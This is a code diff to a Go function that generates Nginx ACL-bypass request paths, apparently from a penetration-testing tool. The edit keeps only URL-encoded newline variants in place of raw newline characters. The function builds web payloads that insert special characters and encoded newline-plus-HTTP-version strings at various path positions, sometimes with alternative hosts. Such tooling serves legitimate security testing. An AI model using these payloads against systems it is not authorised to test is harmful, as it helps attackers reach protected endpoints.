@@ -826,11 +826,14 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	}
 
 	// Add the %0A character (newline) since it can cut the path (Nginx rewrite)
+	// Keep the raw '\n' in rawBypassChars for non-URI based tests if needed elsewhere,
+	// but only use encodedNewline ('%0A') for URI construction below.
 	if !charMap["\n"] {
 		rawBypassChars = append(rawBypassChars, "\n")
 		charMap["\n"] = true
 	}
-	encodedBypassChars = append(encodedBypassChars, "%0A")
+	encodedNewline := "%0A" // Use this consistently for URIs
+	encodedBypassChars = append(encodedBypassChars, encodedNewline)
 
 	// Split the path into segments to insert characters at various positions
 	pathSegments := strings.Split(strings.TrimPrefix(basePath, "/"), "/")
@@ -848,7 +851,10 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 
 	// 1. Generate payloads by appending characters to the end of the path
 	for _, char := range rawBypassChars {
-		addJob(basePath + char + query)
+		// Only add raw characters if they are not problematic for fasthttp URI parsing
+		if char != "\n" {
+			addJob(basePath + char + query)
+		}
 	}
 	for _, encoded := range encodedBypassChars {
 		addJob(basePath + encoded + query)
@@ -857,7 +863,9 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	// 2. Try after a trailing slash if the path doesn't already end with one
 	if !strings.HasSuffix(basePath, "/") {
 		for _, char := range rawBypassChars {
-			addJob(basePath + "/" + char + query)
+			if char != "\n" {
+				addJob(basePath + "/" + char + query)
+			}
 		}
 		for _, encoded := range encodedBypassChars {
 			addJob(basePath + "/" + encoded + query)
@@ -866,7 +874,9 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 
 	// 3. Insert characters at the beginning of the path
 	for _, char := range rawBypassChars {
-		addJob("/" + char + strings.TrimPrefix(basePath, "/") + query)
+		if char != "\n" {
+			addJob("/" + char + strings.TrimPrefix(basePath, "/") + query)
+		}
 	}
 	for _, encoded := range encodedBypassChars {
 		addJob("/" + encoded + strings.TrimPrefix(basePath, "/") + query)
@@ -882,7 +892,9 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 			suffix := "/" + strings.Join(pathSegments[i+1:], "/")
 
 			for _, char := range rawBypassChars {
-				addJob(prefix + char + suffix + query)
+				if char != "\n" {
+					addJob(prefix + char + suffix + query)
+				}
 			}
 			for _, encoded := range encodedBypassChars {
 				addJob(prefix + encoded + suffix + query)
@@ -905,11 +917,11 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 			}
 
 			for _, char := range rawBypassChars {
-				// Combine: prefix + slash + char + currentSegment + restOfPath
-				addJob(prefix + "/" + char + currentSegment + restOfPath + query)
+				if char != "\n" {
+					addJob(prefix + "/" + char + currentSegment + restOfPath + query)
+				}
 			}
 			for _, encoded := range encodedBypassChars {
-				// Combine: prefix + slash + encoded_char + currentSegment + restOfPath
 				addJob(prefix + "/" + encoded + currentSegment + restOfPath + query)
 			}
 		}
@@ -935,20 +947,17 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 			restOfSegment := segment[1:]
 
 			for _, char := range rawBypassChars {
-				modifiedPath := prefix + firstChar + char + restOfSegment + suffix + query
-				addJob(modifiedPath)
+				if char != "\n" {
+					modifiedPath := prefix + firstChar + char + restOfSegment + suffix + query
+					addJob(modifiedPath)
+				}
 			}
-
 			for _, encoded := range encodedBypassChars {
 				modifiedPath := prefix + firstChar + encoded + restOfSegment + suffix + query
 				addJob(modifiedPath)
 			}
 		}
 	}
-
-	// Newline for HTTP version technique
-	newlineChar := string([]byte{0x0A})
-	encodedNewline := "%0A"
 
 	// HTTP version-like strings
 	httpVersions := []string{
@@ -960,9 +969,7 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 
 	// 6. Generate whitespace+HTTP version payloads
 	for _, httpVersion := range httpVersions {
-		// Raw newline
-		addJob(basePath + newlineChar + httpVersion + query)
-		// URL-encoded newline
+		// URL-encoded newline ONLY
 		addJob(basePath + encodedNewline + httpVersion + query)
 
 		// Try at path segment positions
@@ -978,9 +985,7 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 					suffix = "/" + strings.Join(pathSegments[i:], "/")
 				}
 
-				// Raw newline
-				addJob(prefix + newlineChar + httpVersion + suffix + query)
-				// URL-encoded newline
+				// URL-encoded newline ONLY
 				addJob(prefix + encodedNewline + httpVersion + suffix + query)
 			}
 		}
@@ -1015,22 +1020,7 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	for _, httpVersion := range httpVersions {
 		for _, scheme := range schemes {
 			for _, altHost := range alternativeHosts {
-				// Raw newlines
-				uri := basePath + newlineChar + httpVersion + newlineChar + scheme + altHost + basePath + query
-
-				// Basic variant
-				addJob(uri)
-
-				// With explicit Host header
-				addJob(uri, Headers{
-					Header: "Host",
-					Value:  parsedURL.Host,
-				})
-
-				// With original host
-				addJob(basePath + newlineChar + httpVersion + newlineChar + scheme + parsedURL.Host + basePath + query)
-
-				// URL-encoded newlines
+				// URL-encoded newlines ONLY
 				encodedUri := basePath + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + query
 
 				// Basic encoded variant
@@ -1041,6 +1031,9 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 					Header: "Host",
 					Value:  parsedURL.Host,
 				})
+
+				// With original host (using encoded newline)
+				addJob(basePath + encodedNewline + httpVersion + encodedNewline + scheme + parsedURL.Host + basePath + query)
 
 				// Try at different path segments
 				if len(pathSegments) > 1 {
@@ -1055,22 +1048,22 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 							suffix = "/" + strings.Join(pathSegments[i:], "/")
 						}
 
-						// Raw newlines with alternative host
-						segmentUri := prefix + newlineChar + httpVersion + newlineChar + scheme + altHost + basePath + suffix + query
-						addJob(segmentUri)
-
-						// With explicit Host header
-						addJob(segmentUri, Headers{
-							Header: "Host",
-							Value:  parsedURL.Host,
-						})
-
-						// URL-encoded newlines
+						// URL-encoded newlines ONLY with alternative host
 						encodedSegmentUri := prefix + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + suffix + query
 						addJob(encodedSegmentUri)
 
 						// With explicit Host header
 						addJob(encodedSegmentUri, Headers{
+							Header: "Host",
+							Value:  parsedURL.Host,
+						})
+
+						// URL-encoded newlines ONLY with original host
+						encodedOrigHostSegmentUri := prefix + encodedNewline + httpVersion + encodedNewline + scheme + parsedURL.Host + basePath + suffix + query
+						addJob(encodedOrigHostSegmentUri)
+
+						// With explicit Host header
+						addJob(encodedOrigHostSegmentUri, Headers{
 							Header: "Host",
 							Value:  parsedURL.Host,
 						})
